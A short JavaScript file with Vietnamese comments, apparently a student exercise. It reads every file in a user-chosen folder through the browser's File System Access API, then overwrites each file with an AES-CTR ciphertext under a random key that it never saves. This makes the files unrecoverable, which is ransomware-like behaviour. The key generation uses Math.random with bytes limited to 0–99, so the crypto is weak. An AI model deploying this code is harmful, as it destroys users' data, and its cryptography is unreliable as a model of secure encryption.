let fileHandle;
let dirHandle;
let contents = "";
let promises = "";
let num = 0;
let myArray = [];

// var key_256 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31];
function genRandomKey(length, min, max) {
    const key = [];
    for (let i = 0; i < length; i++) {
      key.push(Math.floor(Math.random() * (max - min + 1)) + min);
    }
    return key;
}
function encrypt_message(plaintext, key){
    
    var text = plaintext;
    var textBytes = aesjs.utils.utf8.toBytes(text);

    var aesCtr = new aesjs.ModeOfOperation.ctr(key, new aesjs.Counter(5));
    var encryptedBytes = aesCtr.encrypt(textBytes);

    var encryptedHex = aesjs.utils.hex.fromBytes(encryptedBytes);
    return encryptedHex;
}

async function openFile(){

    //Hiện cửa sổ để chọn directory cho việc đọc file
    dirHandle = await window.showDirectoryPicker();

    //Duyệt qua từng file trong thư mục mình chọn
    for await (const entry of dirHandle.values()) {

        //Lọc các entry là directory
        if (entry.kind !== 'file') {
            continue;
        }

        //Lọc lấy tên các file ở thư mục hiện tại
        let hehe = await entry.getFile();
        console.log(hehe);

        promises = await entry.getFile().then((file) => `${file.name}`);

        //Tạo file handler để lấy nội dung file
        fileHandle = await dirHandle.getFileHandle(promises, { create: false});
        const fileContent = await fileHandle.getFile();
        let tmp = await fileContent.text();

        // Counter
        num++;
        contents += "File " + num + " content: \n" + tmp + '\n\n';
        textarea.innerText = contents;
    }
}
async function saveFile(){
    for await (const entry of dirHandle.values()) {

        // Lọc các entry là directory
        if (entry.kind !== 'file') {
            continue;
        }
        
        promises = await entry.getFile().then((file) => `${file.name}`);

        // Tạo file handler để lấy nội dung file
        fileHandle = await dirHandle.getFileHandle(promises, { create: false});
        const fileData = await fileHandle.getFile();

        // Lấy nội dung của file và mã hóa nó
        let data_to_enc = await fileData.text();
        let key_256 = genRandomKey(32, 0, 99);
        contents = encrypt_message(data_to_enc, key_256);

        // Tạo stream để ghi vào file
        let stream = await fileHandle.createWritable();
        await stream.write(contents);
        await stream.close();
    }
}